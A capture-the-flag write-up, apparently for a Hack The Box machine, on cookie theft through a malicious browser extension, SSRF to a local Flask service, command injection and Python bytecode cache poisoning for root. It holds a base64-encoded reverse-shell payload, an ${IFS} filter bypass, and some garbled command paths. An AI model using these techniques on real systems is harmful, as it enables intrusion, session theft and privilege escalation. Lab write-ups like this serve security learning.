# Initial Access

After our recon, there is nothing interesting except the **Upload Extension** feature. It gives an extension to a bot which runs it in a browser environment on the server. This leads to very interesting possibilities.

We can simply create a malicious extension that steals all the cookies from the browser. Since I didn't have prior experience in creating Chrome extensions, I found this helpful repo: [https://github.com/itstorque/cookie-hijacker-chrome](https://github.com/itstorque/cookie-hijacker-chrome)

I edited what I needed, changed the server receiver host address, and successfully got the cookies for the Gitea page with the domain name `browsedinternals.htb`.

After adding this domain to our `/etc/hosts` file, we gained access to the Gitea repository page.

# Analyze the Source Code in Gitea Repo

Inside the repo, I found a **Flask server** that runs only locally (`localhost`). We can use our extension as an **SSRF** tool to interact with this local server.

After analyzing the code, I found the `/routines/<rid>` endpoint. It takes an `rid` and executes a bash script called `routines.sh` with the provided `rid` as an argument.

In `routines.sh`, the developer compares the `rid` inside **double quotes** using `-eq`.

**This leads to RCE (Remote Code Execution).**

### Logical Breakdown:

The developer thinks it is secure by putting the argument in double quotes, but they don't realize that **Bash** still parses **Command Substitution** `$(...)` inside double quotes. This wouldn't work if they used single quotes.

We can exploit this by invoking a Command Substitution in the `rid` sent via the extension:

```js
function interact_with_localhost_server() {
    // Payload to execute a reverse shell
    let payload = "a[$(echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjI0LzQ0NDUgMD4mMQ==|base64 -d|bash)]"
    // Use ${IFS} to bypass space filtering
    payload = payload.replace(/ /g, "${IFS}")
    fetch(`http://localhost:5000/routines/${encodeURIComponent(payload)}`)
}
```

After uploading the extension, the command was executed, and we got a shell! We captured `user.txt` and grabbed the SSH keys for a more stable shell.# PrivEsc

lets check the sudo premonitions

```bash
sudo -l
```

and yea

```bash
Matching Defaults entries for larry on browsed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
```


we can run the script /opt/extensiontool/extension_tool.py as root
## Arbitrary File Read via Symlink (Attempt)

after analyze the code for a lot of time i found an artibratay file read via symlink 

in this part of the script extension_tool.py

```python
def package_extension(source_dir, output_file):
	temp_dir = '/opt/extensiontool/temp'
	# if the folder doesnot exsit it will create it	
	if not os.path.exists(temp_dir):
		os.mkdir(temp_dir)
	
	output_file = os.path.basename(output_file)
	with zipfile.ZipFile(os.path.join(temp_dir,output_file), 'w', zipfile.ZIP_DEFLATED) as zipf:
		for foldername, subfolders, filenames in os.walk(source_dir):
		
			for filename in filenames:
				filepath = os.path.join(foldername, filename) # extension folder + current filename in this folder
				arcname = os.path.relpath(filepath, source_dir) # make a relative path of the filepath directory
				zipf.write(filepath, arcname) # write the zip get the data from filepath variable then put it in arcname path!
		
	print(f"[+] Extension packaged as {temp_dir}/{output_file}")
```


```python
args.ext = os.path.basename(args.ext)

if not (args.ext in os.listdir(EXTENSION_DIR)):
	print(f"[X] Use one of the following extensions : {os.listdir(EXTENSION_DIR)}")
	exit(1)

extension_path = os.path.join(EXTENSION_DIR, args.ext)
```


```python
# Package the extension
if (args.zip):
	package_extension(extension_path, args.zip)
```


as you see here it uses extension_path as the source_dir parameter

and the extension_path it the path of the extension folder in the extensions folder

it validate if the extension you give to it is in the EXTENSION_DIR if not it will exit

so you have to create it first in the EXTENSION_DIR

if you have a write assess to the EXTENSION_DIR you can create a folder and create a symlink to another file ssh as the root flag that we want /root/root.txt  in that folder

so simply when it call the function package_extension it will list all content of the folder you created then it will a file that symlink to /root/root.txt and it will go to join 

```python
filepath = os.path.join(foldername,"/root/root.txt")
arcname = os.path.relpath("/root/root.txt", extension_path)
zipf.write(filepath, arcname) # it will take the source of /root/root.txt and put it in realtive path in the zip
```

so after that you will have to unzip this archive and you will find the flag 

but this will not work because we don't have a write premonitions to the EXTENSION_DIR `._.`


## cache poising


but there another thing that not normal see 

```bash
larry@browsed:/opt/extensiontool$ ls -la
total 24
drwxr-xr-x 4 root root 4096 Dec 11 07:54 .
drwxr-xr-x 4 root root 4096 Aug 17  2025 ..
drwxrwxr-x 5 root root 4096 Mar 23  2025 extensions
-rwxrwxr-x 1 root root 2739 Mar 27  2025 extension_tool.py
-rw-rw-r-- 1 root root 1245 Mar 23  2025 extension_utils.py
drwxrwxrwx 2 root root 4096 Dec 11 07:57 __pycache__
```


see others has all premonitions in `__pycache__` folder which used by python to cache the modules that program use for optimizing the speed rather than parsing it again

if we replace the file in `__pycache__` with a malicious one in valid format that python will accept that script will load our malicious library cache

in extension_tool.py it imports the extension_utils.py it uses the function clean_temp_files() and validate_manifest() anyways

i found an helpful blog that explain the poc of this. i recommend you to read it

https://python.plainenglish.io/python-cache-poisoning-elevating-your-privileges-with-malicious-bytecode-278c9cba0e22


so we have to see the size of the original file and its modify time

```bash
stat /opt/extensiontool/extension_utils.py
```

```bash
  File: /opt/extensiontool/extension_utils.py
  Size: 1245      	Blocks: 8          IO Block: 4096   regular file
Device: 252,0	Inode: 8541        Links: 1
Access: (0664/-rw-rw-r--)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2025-12-11 07:55:29.513046120 +0000
Modify: 2025-03-23 10:56:19.000000000 +0000
Change: 2025-08-17 12:55:02.920923490 +0000
 Birth: 2025-08-17 12:55:02.920923490 +0000
```


first we have to create a file with the same size lets copy the original then editing it with malicious code like


```python
os.system("/bin/bash -p")
```

and just delete or add and characters to make sure you have the same size which is 1245


ok now we have to make the malicious code with the same modify time of the original

we can do it by

```
touch -r /opt/extensiontool/extension_utils.py malicous.py
```

now we have to compile it to pyc

```bash
python3 -m py_compile malicous.py
```

the output .pyc will be stored in `__pycache__`

ok now lets run the program to just make the cache

```
sudo /opt/extensiontool/extension_utils.py --clean
```

on now there is a cache in `/opt/extensiontool/__pycache__`  lets check if our malicious cache is the same as the original in headers


```bash
larry@browsed:/opt/extensiontool/__pycache__$ xxd extension_utils.cpython-312.pyc |head -1
00000000: cb0d 0d0a 0000 0000 d3e8 df67 dd04 0000  ...........g....
```

```bash
larry@browsed:/tmp/__pycache__$ xxd malicous.cpython-312.pyc |head -1
00000000: cb0d 0d0a 0000 0000 d3e8 df67 dd04 0000  ...........g....
```

as you see the header is the same in both

now lets posing the original cache with our malicious cache

```bash
 mv _/tmp/__pycache__pyc_malicous.cpython-312.pyc /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc
```


now you can simply run the program 

```bash
sudo /opt/extensiontool/extension_utils.py --clean
```

boom got root !. Good luck ;)